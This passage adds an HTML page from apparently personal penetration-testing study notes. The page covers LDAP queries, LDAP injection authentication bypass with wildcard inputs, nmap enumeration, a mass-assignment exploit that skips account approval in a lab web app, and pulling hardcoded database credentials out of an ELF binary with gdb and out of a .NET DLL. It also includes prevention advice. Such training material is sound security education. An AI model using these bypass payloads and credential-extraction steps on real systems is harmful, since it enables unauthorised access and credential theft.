+<p>... is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+</code></pre>
+<p>This command can be broken down as follows:</p>
+<ul>
+<li>Connect to the server <code>ldap.exmaple.com</code> on port 389.</li>
+<li>Bind as <code>cn=admin,dc=example,dc=com</code> with password "secret123".</li>
+<li>Search under the base DN <code>ou=people,dc=example,dc=com</code>.</li>
+<li>Use the filter <code>(mail=john.doe@example.com)</code> to find entries that have this email address.</li>
+</ul>
+<p>The server would process the request and send back a response, which might look something like this:</p>
+<pre><code>dn: uid=jdoe,ou=people,dc=example,dc=com
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+cn: John Doe
+sn: Doe
+uid: jdoe
+mail: john.doe@example.com
+
+result: 0 Success
+</code></pre>
+<p>This response includes the entry's distinguished name that matches the search criteria and its attributes and values.</p>
+<h3 id="ldap-injection"><a class="header" href="#ldap-injection">LDAP Injection</a></h3>
+<p>... is an attack that exploits web applications that use LDAP for authentication or storing user information. The attacker can inject malicious code or chars into LDAP queries to alter the application's behaviour, bypass security measures, and access sensitive data stored in the LDAP directory.</p>
+<p>To test LDAP injection, you can use input values that contain special chars or operators that can change the query's meaning:</p>
+<div class="table-wrapper"><table><thead><tr><th>Input</th><th>Description</th></tr></thead><tbody>
+<tr><td><code>*</code></td><td>An asterisk can match any number of chars.</td></tr>
+<tr><td><code>( )</code></td><td>Parantheses can group expressions.</td></tr>
+<tr><td><code>|</code></td><td>A vertical bar can perform logical OR.</td></tr>
+<tr><td><code>&amp;</code></td><td>An ampersand can perform logical AND.</td></tr>
+<tr><td><code>(cn=*)</code></td><td>Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. For example, <code>(cn=*)</code> or <code>(objectClass=*)</code> can be used as input values for a username or password fields.</td></tr>
+</tbody></table>
+</div>
+<p>LDAP injection attacks are similar to SQLi attacks but target the LDAP directory service instead of a database.</p>
+<p>For example, suppose an application uses the following LDAP query to authenticate users:</p>
+<pre><code>(&amp;(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+</code></pre>
+<p>In this query, <code>$username</code> and <code>$password</code> contain the user's login credentials. An attacker could inject the <code>*</code> character into the <code>$username</code> or <code>$password</code> field to modify the LDAP query and bypass authentication.</p>
+<p>If an attacker injects the <code>*</code> into the <code>$username</code> field, the LDAP query will match any user account with any password. This would allow the attacker to gain access to the application with any password, as shown below:</p>
+<pre><code>$username = "*";
+$password = "dummy";
+(&amp;(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+</code></pre>
+<p>Alternatively, if an attacker injects the <code>*</code> into the <code>$password</code> field, the LDAP query would match any user account with any password that contains the injected string. This would allow the attacker to gain access to the application with any username, as shown below:</p>
+<pre><code>$username = "dummy";
+$password = "*";
+(&amp;(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+</code></pre>
+<p>LDAP injection attacks can lead to severe consequences, such as unauthorised access to sensitive information, elevated priviliges, and even full control over the affected application or server. These attacks can also considerably impact data integrity and availability, as attackers may alter or remove data within the directory service, causing disruptions to applications and services dependent on that data.</p>
+<p>To mitigate the risks associated with LDAP injection attacks, it is crucial to thoroughly validate and sanitize user input before incorporating it into LDAP queries. This process should involve removing LDAP-specific special characters like <code>*</code> and employing parameterised queries to ensure user input is treated solely as data, not executable code.</p>
+<h3 id="enumeration-2"><a class="header" href="#enumeration-2">Enumeration</a></h3>
+<p>Enumerating the target helps you to understand services and exposed ports.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:43 SAST
+Nmap scan report for 10.129.204.229
+Host is up (0.18s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Login
+389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 149.73 seconds
+</code></pre>
+<p>As OpenLDAP runs on the server, it is safe to assume that the web application running on port 80 uses LDAP for authentication.</p>
+<p>Attempting to log in using a wildcard char in the username and password field grants access to the system, effectively bypassing any authentication measures that had been implemented. This is a significant security issue as it allows anyone with knowledge of the vulnerability to gain unauthorised access to the system and potentially sensitive data.</p>
+<h2 id="web-mass-assignment"><a class="header" href="#web-mass-assignment">Web Mass Assignment</a></h2>
+<p>Several framekworks offer handy mass-assignment features to lessen the workload for devs. Because of this, programmers can directly insert a whole set of user-entered data from a form into an object or database. This feature is often used without a whitelist for protecting the fields from the user's input. This vuln could be used by an attacker to steal sensitive information or destroy data.</p>
+<p>Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server. Reversing the code, attackers can see these parameters and by assigning values to critical unprotected parameters during the HTTP request, they can edit the data of a database and change the intended functionality of an application.</p>
+<p>Ruby on Rails is a web application framework that is vulnerable to this type of attack. The following example shows how attackers can exploit mass assignment vulnerability in Ruby on Rails. Assuming you have a User model with the following attributes:</p>
+<pre><code class="language-ruby">class User &lt; ActiveRecord::Base
+  attr_accessible :username, :email
+end
+</code></pre>
+<p>The above model specifies that only the username and email attributes are allowed to be mass-assigned. However, attackers can modify other attributes by tampering with the parameters sent to the server. Assume that the server receives the following parameters.</p>
+<pre><code class="language-javascript">{ "user" =&gt; { "username" =&gt; "hacker", "email" =&gt; "hacker@example.com", "admin" =&gt; true } }
+</code></pre>
+<p>Although the User model does not explicitly state the admin attribute is accessible, the attacker can still change it because it is present in the arguments. Bypassing any access controls that may be in place, the attacker can send this data as part of a POST request to the server establish a user with admin privileges.</p>
+<h3 id="exploit-mass-assignment"><a class="header" href="#exploit-mass-assignment">Exploit Mass Assignment</a></h3>
+<p>Suppose you come across the following application that features an Asset Manager web app. Also suppose that the application's source code has been provided to you. Completing the registration step, you get the message "Success!!", and you can try to log in.</p>
+<p><img src="../../../images/exploiting_mass_assignment1.png" alt="exploiting mass assignment 1" /></p>
+<p>After login in, you get the message "Account is pending for approval". The administrator of this web app must approve your registration. Reviewing the python code of the <code>/opt/asset-manager/app.py</code> file reveals the following snippet.</p>
+<pre><code class="language-python">for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
+  if k:
+    session['user']=i
+    return redirect("/home",code=302)
+  else:
+    return render_template('login.html',value='Account is pending for approval')
+</code></pre>
+<p>You can see that the application is checking if the value <code>k</code> is set. If yes, then it allows the user to log in. In the code below, you can also see that if you set the <code>confirmed</code> parameter during registration, then it inserts <code>cond</code> as <code>True</code> and allows you to bypass the registration checking step.</p>
+<pre><code class="language-python">try:
+  if request.form['confirmed']:
+    cond=True
+except:
+      cond=False
+with sqlite3.connect("database.db") as con:
+  cur = con.cursor()
+  cur.execute('select * from users where username=?',(username,))
+  if cur.fetchone():
+    return render_template('index.html',value='User exists!!')
+  else:
+    cur.execute('insert into users values(?,?,?)',(username,password,cond))
+    con.commit()
+    return render_template('index.html',value='Success!!')
+</code></pre>
+<p>In that case, what you should try is to register another user and try setting the <code>confirmed</code> parameter to a random value. Using Burp, you can capture the HTTP POST request to the <code>/register</code> page and set the parameters <code>username=new&amp;password=test&amp;confirmed=test</code>.</p>
+<p><img src="../../../images/exploiting_mass_assignment2.png" alt="exploiting mass assignment 2" /></p>
+<p>You can now try to log in to the application using the <code>new:test</code> credentials.</p>
+<p><img src="../../../images/exploiting_mass_assignment3.png" alt="exploiting mass assignment 3" /></p>
+<p>The mass assignment vulnerability is exploited successfully and you are now logged into the web app without waiting for the administrator to approve your registration request.</p>
+<h3 id="prevention"><a class="header" href="#prevention">Prevention</a></h3>
+<p>To prevent this type of attack, one should explicitly assign the attributes for the allowed fields, or use whitelisting methods provided by the framework to check the attributes that can be mass-assigned. The following example shows how to use strong parameters in the <code>User</code> controller.</p>
+<pre><code class="language-ruby">class UsersController &lt; ApplicationController
+  def create
+    @user = User.new(user_params)
+    if @user.save
+      redirect_to @user
+    else
+      render 'new'
+    end
+  end
+
+  private
+
+  def user_params
+    params.require(:user).permit(:username, :email)
+  end
+end
+</code></pre>
+<p>In the example above, the <code>user_params</code> method returns a new hash that includes only the <code>username</code> and <code>email</code> attributes, ignoring any more input the client may have sent. By doing this, you ensure that only explicitly permitted attributes can be changed by mass assignment.</p>
+<h2 id="applications-connecting-to-services"><a class="header" href="#applications-connecting-to-services">Applications Connecting to Services</a></h2>
+<p>Applications that are connected to services often include connection strings that can be leaked if they are not protected sufficiently.</p>
+<h3 id="elf-executable-examination"><a class="header" href="#elf-executable-examination">ELF Executable Examination</a></h3>
+<p>The octupus_checker binary is found on a remote machine during the testing. Running the application locally reveals that it connects to database instances in order to verify that they are available.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ./octopus_checker 
+
+Program had started..
+Attempting Connection 
+Connecting ... 
+
+The driver reported the following diagnostics whilst running SQLDriverConnect
+
+01000:1:0:[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
+connected
+</code></pre>
+<p>The binary probably connects using a SQL connection string that contains credentials. Using tools like <a href="https://github.com/longld/peda">PEDA</a> (<em>Python Exploit Development Assistance for GDB</em>) you can further examine the file. Running the following command you can execute the binary through it.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ gdb ./octopus_checker
+
+GNU gdb (Debian 9.2-1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./octopus_checker...
+(No debugging symbols found in ./octopus_checker)
+</code></pre>
+<p>Once the binary is loaded, you set the disassembly-flavor to define the display style of code, and you proceed with disassembling the main function of the program.</p>
+<pre><code class="language-asm">gdb-peda$ set disassembly-flavor intel
+gdb-peda$ disas main
+
+Dump of assembler code for function main:
+   0x0000555555555456 &lt;+0&gt;:	endbr64 
+   0x000055555555545a &lt;+4&gt;:	push   rbp
+   0x000055555555545b &lt;+5&gt;:	mov    rbp,rsp
+ 
+ &lt;SNIP&gt;
+ 
+   0x0000555555555625 &lt;+463&gt;:	call   0x5555555551a0 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
+   0x000055555555562a &lt;+468&gt;:	mov    rdx,rax
+   0x000055555555562d &lt;+471&gt;:	mov    rax,QWORD PTR [rip+0x299c]        # 0x555555557fd0
+   0x0000555555555634 &lt;+478&gt;:	mov    rsi,rax
+   0x0000555555555637 &lt;+481&gt;:	mov    rdi,rdx
+   0x000055555555563a &lt;+484&gt;:	call   0x5555555551c0 &lt;_ZNSolsEPFRSoS_E@plt&gt;
+   0x000055555555563f &lt;+489&gt;:	mov    rbx,QWORD PTR [rbp-0x4a8]
+   0x0000555555555646 &lt;+496&gt;:	lea    rax,[rbp-0x4b7]
+   0x000055555555564d &lt;+503&gt;:	mov    rdi,rax
+   0x0000555555555650 &lt;+506&gt;:	call   0x555555555220 &lt;_ZNSaIcEC1Ev@plt&gt;
+   0x0000555555555655 &lt;+511&gt;:	lea    rdx,[rbp-0x4b7]
+   0x000055555555565c &lt;+518&gt;:	lea    rax,[rbp-0x4a0]
+   0x0000555555555663 &lt;+525&gt;:	lea    rsi,[rip+0xa34]        # 0x55555555609e
+   0x000055555555566a &lt;+532&gt;:	mov    rdi,rax
+   0x000055555555566d &lt;+535&gt;:	call   0x5555555551f0 &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@plt&gt;
+   0x0000555555555672 &lt;+540&gt;:	lea    rax,[rbp-0x4a0]
+   0x0000555555555679 &lt;+547&gt;:	mov    edx,0x2
+   0x000055555555567e &lt;+552&gt;:	mov    rsi,rbx
+   0x0000555555555681 &lt;+555&gt;:	mov    rdi,rax
+   0x0000555555555684 &lt;+558&gt;:	call   0x555555555329 &lt;_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs&gt;
+   0x0000555555555689 &lt;+563&gt;:	lea    rax,[rbp-0x4a0]
+   0x0000555555555690 &lt;+570&gt;:	mov    rdi,rax
+   0x0000555555555693 &lt;+573&gt;:	call   0x555555555160 &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt&gt;
+   0x0000555555555698 &lt;+578&gt;:	lea    rax,[rbp-0x4b7]
+   0x000055555555569f &lt;+585&gt;:	mov    rdi,rax
+   0x00005555555556a2 &lt;+588&gt;:	call   0x5555555551d0 &lt;_ZNSaIcED1Ev@plt&gt;
+   0x00005555555556a7 &lt;+593&gt;:	cmp    WORD PTR [rbp-0x4b2],0x0
+
+&lt;SNIP&gt;
+
+   0x0000555555555761 &lt;+779&gt;:	mov    rbx,QWORD PTR [rbp-0x8]
+   0x0000555555555765 &lt;+783&gt;:	leave  
+   0x0000555555555766 &lt;+784&gt;:	ret    
+End of assembler dump.
+</code></pre>
+<p>This reveals several call instructions that point to addresses containing strings. They appear to be sections of a SQL connection string, but the sections are not in order, and the endianness entails that the string text is reversed. Endianness defines the order that the bytes are read in different architectures. Further down the function, you see a call to SQLDriverConnect.</p>
+<pre><code class="language-asm">   0x00005555555555ff &lt;+425&gt;:	mov    esi,0x0
+   0x0000555555555604 &lt;+430&gt;:	mov    rdi,rax
+   0x0000555555555607 &lt;+433&gt;:	call   0x5555555551b0 &lt;SQLDriverConnect@plt&gt;
+   0x000055555555560c &lt;+438&gt;:	add    rsp,0x10
+   0x0000555555555610 &lt;+442&gt;:	mov    WORD PTR [rbp-0x4b4],ax
+</code></pre>
+<p>Addind a breakpoint at this address and running the program once again, reveals a SQL connection string in the RDX register address, containing the creds for a local database instance.</p>
+<pre><code class="language-asm">gdb-peda$ b *0x5555555551b0
+
+Breakpoint 1 at 0x5555555551b0
+
+
+gdb-peda$ run
+
+Starting program: /htb/rollout/octopus_checker 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Program had started..
+Attempting Connection 
+[----------------------------------registers-----------------------------------]
+RAX: 0x55555556c4f0 --&gt; 0x4b5a ('ZK')
+RBX: 0x0 
+RCX: 0xfffffffd 
+RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
+RSI: 0x0 
+RDI: 0x55555556c4f0 --&gt; 0x4b5a ('ZK')
+
+&lt;SNIP&gt;
+</code></pre>
+<p>Apart from trying to connect to the MSSQL service, pentesters can also check if the password is reusable from users of the same network.</p>
+<h3 id="dll-file-examination"><a class="header" href="#dll-file-examination">DLL File Examination</a></h3>
+<p>A DLL file is a Dynamically Linked Library and it contains code that is called from other programs while they are running. The MultimasterAPI.dll binary is found on a remote machine during the enumeration process. Examination of the file reveals that this is a .ENT assembly.</p>
+<pre><code class="language-powershell">C:\&gt; Get-FileMetaData .\MultimasterAPI.dll
+
+&lt;SNIP&gt;
+M .NETFramework,Version=v4.6.1 TFrameworkDisplayName.NET Framework 4.6.1    api/getColleagues        ! htt
+p://localhost:8081*POST         Ò^         øJ  ø,  RSDSœ»¡ÍuqœK£"Y¿bˆ   C:\Users\Hazard\Desktop\Stuff\Multimast
+&lt;SNIP&gt;
+</code></pre>
+<p>Using the debugger and .NET assembly editor <a href="https://github.com/0xd4d/dnSpy">dnSpy</a>, you can view the source code directly. This tool allows reading, editing, and debugging the source code of a .NET assembly. Inspection of MultimasterAPI.Controllers -&gt; ColleagueController reveals a database connection string containing the password.</p>
+<p><img src="../../../images/apps_connecting_to_services1.png" alt="apps connecting to services 1" /></p>
+<p>Apart from trying to connect to the MSSQL service, attacks like password spraying can also be used to test the security of other services.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../attack/initial_access/attacking_common_applications/attacking_infra_network_tools.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../attack/initial_access/attacking_common_applications/attacking_other_apps.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../attack/initial_access/attacking_common_applications/attacking_infra_network_tools.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../attack/initial_access/attacking_common_applications/attacking_other_apps.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+
+    </div>
+    </body>
+</html>
